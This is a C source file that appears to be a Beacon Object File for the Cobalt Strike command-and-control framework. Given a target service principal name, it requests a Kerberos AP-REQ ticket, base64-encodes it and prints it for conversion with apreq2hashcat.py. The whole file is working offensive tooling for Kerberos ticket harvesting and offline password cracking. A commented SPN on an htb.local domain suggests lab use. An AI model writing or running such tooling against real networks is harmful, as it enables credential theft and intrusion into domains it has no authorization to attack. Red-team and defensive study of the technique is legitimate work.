#define SECURITY_WIN32
#include <windows.h>
#include <security.h>
#include "lib/libc.h"
#include "lib/beacon.h"

DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$AcquireCredentialsHandleW(SEC_WCHAR*, SEC_WCHAR*, ULONG, PLUID, PVOID, SEC_GET_KEY_FN, PVOID, PCredHandle, PTimeStamp);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$InitializeSecurityContextW(PCredHandle, PCtxtHandle, SEC_WCHAR*, ULONG, ULONG, ULONG, PSecBufferDesc, ULONG, PCtxtHandle, PSecBufferDesc, PULONG, PTimeStamp);
WINIMPM BOOL WINAPI CRYPT32$CryptBinaryToStringA(CONST BYTE*, DWORD, DWORD, LPSTR, DWORD*);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$FreeCredentialsHandle(PCredHandle);
WINBASEAPI void* WINAPI MSVCRT$malloc(SIZE_T);

BOOL RequestApREQ(wchar_t* spn)
{
	CredHandle hCredential;
	TimeStamp tsExpiry;
	SECURITY_STATUS getHandle = SECUR32$AcquireCredentialsHandleW(
		NULL,
		MICROSOFT_KERBEROS_NAME,
		SECPKG_CRED_OUTBOUND,
		NULL,
		NULL,
		NULL,
		NULL,
		&hCredential,
		&tsExpiry
	);

	if (hCredential.dwLower == NULL)
	{
		BeaconPrintf(CALLBACK_ERROR, "AcquireCredentialsHandleW failed: %S\n", getHandle);
		return FALSE;
	}

	CtxtHandle newContext;
	SecBuffer secbufPointer = { 0, SECBUFFER_TOKEN, NULL };
	SecBufferDesc output = { SECBUFFER_VERSION, 1, &secbufPointer };
	ULONG contextAttr;
	TimeStamp expiry;

	// Initiate outbound security context via credential handle
	SECURITY_STATUS initSecurity = SECUR32$InitializeSecurityContextW(
		&hCredential,
		NULL,
		(SEC_WCHAR*)spn,
		ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH,
		0,
		SECURITY_NATIVE_DREP,
		NULL,
		0,
		&newContext,
		&output,
		&contextAttr,
		NULL
	);

	if(output.pBuffers->pvBuffer == NULL){
		BeaconPrintf(CALLBACK_ERROR, "[-] InitializeSecurityContextW failed: %S\n", getHandle);
		return FALSE;
	}

	DWORD destSize;
	//PBYTE ticket = (PBYTE)output.pBuffers->pvBuffer;
	//LONG size = (ULONG)output.pBuffers->cbBuffer;`
	//BeaconPrintf(CALLBACK_OUTPUT, "Token buffer generated %D bytes\n", size);

	// base64 encode
	BOOL b64alloc = CRYPT32$CryptBinaryToStringA(
		(CONST BYTE*)output.pBuffers->pvBuffer,
		(DWORD)output.pBuffers->cbBuffer,
		CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
		NULL,
		&destSize);
	
	LPSTR ticket = (LPSTR)MSVCRT$malloc((SIZE_T)destSize);

	BOOL b64read = CRYPT32$CryptBinaryToStringA(
		(CONST BYTE*)output.pBuffers->pvBuffer,
		(DWORD)output.pBuffers->cbBuffer,
		CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
		ticket,
		&destSize
	);

	if(b64alloc && b64read){
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Got Ticket! Convert it with apreq2hashcat.py");
		BeaconPrintf(CALLBACK_OUTPUT, "%s", ticket);
	}else{
		BeaconPrintf(CALLBACK_ERROR, "[-] Failed to b64 encode ticket");
	}

	//cleanup
	SECUR32$FreeCredentialsHandle(&hCredential);

	return TRUE;
}

void go(char* args, int len)
{
	datap parser;
	
	BeaconDataParse(&parser, args, len);
	
	wchar_t* targetSPN = (wchar_t*)BeaconDataExtract(&parser, NULL);
	
	BeaconPrintf(CALLBACK_OUTPUT,"[+] Target SPN: %S\n", targetSPN);

	RequestApREQ(targetSPN);
	//RequestApREQ(L"http/win2016.htb.local");
}
